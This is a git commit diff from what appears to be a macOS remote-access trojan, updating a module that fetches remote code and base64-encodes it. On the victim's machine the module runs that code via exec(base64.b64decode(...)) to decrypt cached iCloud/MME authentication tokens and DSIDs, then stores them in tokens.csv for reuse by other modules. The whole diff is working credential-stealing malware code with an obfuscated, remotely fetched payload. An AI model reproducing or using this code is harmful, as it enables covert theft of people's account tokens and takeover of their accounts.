911d7a22d796c4d1166e4460712c440fc6b92b22
Marten4n6 <Marten4n6@users.noreply.github.com>
2018-02-04 19:07:39 +0100

    Update decrypt_mme module.
    Retrieved tokens are now stored on the client (in tokens.csv), this allows any other module to use the tokens at a later time.

--- modules/decrypt_mme.py
+++ modules/decrypt_mme.py
@@ -1,5 +1,6 @@
 from helpers import *
 import urllib2
+import base64
 
 
 class Module:
@@ -25,11 +26,44 @@ class Module:
             request = urllib2.Request(url=request_url)
             response = "".join(urllib2.urlopen(request).readlines())
 
-            self.code = response
+            self.code = base64.b64encode(response)
             return True
         else:
             print MESSAGE_INFO + "Cancelled."
             return False
 
     def run(self):
-        return self.code
+        return """\
+        import csv
+        
+        tokens_file = get_program_directory() + "/tokens.csv"
+        
+        if os.path.exists(tokens_file):
+            print MESSAGE_INFO + "\\"tokens.csv\\" already exists, skipping prompt..."
+            
+            with open(tokens_file, "rb") as csv_file:
+                reader = csv.reader(csv_file, delimiter=',', quotechar='"')
+                
+                for row in reader:
+                    print ": ".join(row)
+        else:
+            # Store the results in tokens.csv.
+            result = run_command("python -c 'import base64; exec(base64.b64decode(\\"{0}\\"))'", False, False)
+        
+            with open(tokens_file, "wb") as csv_file:
+                writer = csv.writer(csv_file, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
+            
+                for line in result.split("\\n"):
+                    if line.startswith("Decrypting token plist"):
+                        token_file = line.split("-> ")[1].replace("[", "").replace("]", "")
+                        dsid = os.path.basename(token_file)
+                        
+                        print "DSID: " + dsid
+                        writer.writerow(["DSID", dsid])
+                    elif "Token" in line and not "not cached" in line:
+                        line = line.replace("\\033[35m", "")  # Remove the color, thanks.
+                    
+                        print line
+                        writer.writerow([line.split(": ")[0], line.split(": ")[1]])
+                print MESSAGE_INFO + "Tokens saved to \\"tokens.csv\\"."
+        """.format(self.code)
